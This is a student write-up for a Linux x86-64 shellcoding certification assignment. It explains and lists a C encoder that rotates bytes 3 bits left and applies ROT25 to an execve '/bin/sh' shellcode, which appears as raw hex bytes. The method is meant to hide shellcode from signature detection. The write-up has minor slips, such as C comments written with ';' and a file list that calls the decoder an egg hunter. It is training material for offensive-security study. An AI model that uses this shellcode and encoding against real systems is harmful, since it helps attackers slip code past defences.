## Assignment #4: Create Encoding Scheme
---
---
### Introduction
---
This assignment consist on creating a Custom Encoder like the Insertion Encoder, and create a PoC using the [Execve-Stack](https://github.com/galminyana/SLAE64/blob/main/Assignment04/Execve-Stack.nasm) as the shellcode. 
Once this is done, a decoder stub has to be implemented in ASM to decode our shellcode and run it. The encoder will be done using C language.

### Encoder Schema
---
The Encoder requires a working shellcode as input. This string containing the shellcode, will be encoded with the schema and the results will be printed in hexadecimal. 

The encoder will do the following: 
- Rotate each byte of the shellcode 3 bits to left 
- Do a ROT25 on each byte of the shellcode 

#### Left Shift Byte Bits
First to do in the Encoder is to shift 3 bites to left on each byte of the original shellcode:

- Get a byte from the shellcode string
- Shift the bits three positions to left
- If the most significant bit is "1" it should rotate to the less significant bit

This is implemented in the following way:
```pseudocode
shifted_byte = ( original_byte << SHIFTS ) | ( original_byte >> ( BITS_TO_ROTATE - SHIFTS ))
```
Where:
- SHIFTS is how many shifts to do. It our case, is "3" shifts to left
- BITS_TO_ROTATE indicates how many bits are implied in the rotation. As we are working with bytes, it's value is "8" bits.

#### ROT25
Once the original shellcode has been Left Shifted, it's time to ROT25 it. As we work with bytes it's values can go from 0x00 to 0xFF
- Each byte of the shellcode will get a new value that’s the actual value + 25
- In the case of the last 25 possible values for a byte, we will start from 0x00. 

This table will show the idea:
```markdown
  --------------------------------------------------------------------------------
  |  Original Value    0x00   0x01   ...   0x80   ...   0xe7   0xe8   ...   0xff |
  |  Decimal Value        0      1   ...    128   ...    231    232   ...    255 |
  |  ROT25 Value       0x19   0x1a   ...   0x99   ...   0x00   0x01   ...   0x18 |
  --------------------------------------------------------------------------------
```
This will be implemented for each byte in this way:
```pseudocode
rot_max_value = 256 – 25		                         ; 231 (0xe7) 
if (original_value < rot_max_value) then 
   rot25_value = original_value + 25 
else				                                         ; Here the value will be 231 or greater 
   rot25_value = (original_value + rot) – 256        ; It's rotated from the start
end if 
```
### Encoder Implementation
---
The encode will be implemented in C language. 

- A string is defined to store the original shellcode. This is the string to encode. From the [Execve-Stack](https://github.com/galminyana/SLAE64/blob/main/Assignment04/Execve-Stack.nasm): 
```c
unsigned char code[]= \ 
"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50
 \x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"; 
```
- For each byte of the original shellcode, it's bites are shifted "3" positions to left:
  - A bucle iterates each byte of the string, and for each byte
  - Each byte is shifted to right as been explained in the previous sections
  - The shifted byte value is printed on stdout
```c
        // 3 bits left Rotation 
        for (int i = 0; i< strlen(code); i++) { 
            code[i] = (code[i] << SHIFTS) | ( code[i] >> (BITS_TO_ROTATE - SHIFTS)); 
            printf("0x%02x,", code[i]); 
        }	 
```
- Once shellcode been shifted, a ROT25 is applied:
  - If the byte value is lower than "231", simply adds 25 to the byte value
  - If the byte value is greater or equal to "231", adds 25 to it's value for substracting 256 of it
  - Prints each byte one ROT'ed on screen
```c
        // ROTX the ShellCode 
        unsigned char rot = 25; 
        unsigned char max_rot = 256 - rot; 

        for (int i = 0; i < strlen(code); i++) { 
                if (code[i] < max_rot) {                     ; value < "231"
                        code[i] = code[i] + rot;             ; Add 25
                        printf("0x%02x,",code[i]); 
                } else {                                     ; value >= "31"
                        code[i] = (code[i] + rot) - 256;     ; value = original_value + rot - 256
                        printf("0x%02x,",code[i]); 
                } 
        } 
```

After this all, the Encoded shellcode will be printed in screen. This is the shellcode that needs to go into the ASM Decoder Stub to be decoded and executed. The following info for later use is printed on screen:
- Legth of the shellcode
- The original shellcode string in hex 
- The string in hex of the left rotated shellcode 
- The string in hex of ROT25 of the already rotated shellcode 

The Encoder code is on [GitHub Repo](https://github.com/galminyana/SLAE64/blob/main/Assignment04/) in the [Encoder.c](https://github.com/galminyana/SLAE64/blob/main/Assignment04/Encoder.c):

```c
#include <stdio.h>
#include <string.h>

#define BITS_TO_ROTATE	8
#define SHIFTS 		      3

unsigned char code[]= \
"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";

void main (void)
{
	printf("\nShellCode Length: %d\n", strlen(code)); 
	printf("\nOriginal ShellCode:\n");

	for (int i = 0; i < strlen(code); i++) {
		printf("0x%02x,", code[i]);
	}

	printf("\n\nShifted Left 3 bits ShellCode:\n");

	// 3 bits left Rotation
	for (int i = 0; i< strlen(code); i++) {
		code[i] = (code[i] << SHIFTS) | ( code[i] >> (BITS_TO_ROTATE - SHIFTS));
		printf("0x%02x,", code[i]);
	}

	printf("\n\nROT25 ShellCode:\n");

	// ROTX the ShellCode
	unsigned char rot = 25;
	unsigned char max_rot = 256 - rot;

	for (int i = 0; i < strlen(code); i++) {
		if (code[i] < max_rot) {
			code[i] = code[i] + rot;
			printf("0x%02x,",code[i]);
		} else {
			code[i] = (code[i] + rot) - 256;
			printf("0x%02x,",code[i]);
		}
	}
	printf("\n");
}	
```
### Encoder: Compile and Run
---














### GitHub Repo Files
---
The [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment04) for this assignment contains the following files:

- [Encoder.c](https://github.com/galminyana/SLAE64/blob/main/Assignment04/Encoder.c) : This C file is the implementation of the Encoder Scheme. Prints out a encoded shellcode.
- [Decode-Execve-Stack.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment04/Decode-Execve-Stack.nasm) : This is the NULL free code for the Egg Hunter.
- [Execve-Stack.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment4/ReverseShell-ExecveStack_V2.nasm) : This is the code for the shellcode to use in the PoC.
- [shellcode.c](https://github.com/galminyana/SLAE64/blob/main/Assignment04/shellcode.c) : The C template Decode-Execve-Stack.nasm Shellcode, ready to compile and execute


### The End
---
This pages have been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html).

Student ID: PA-14628
 
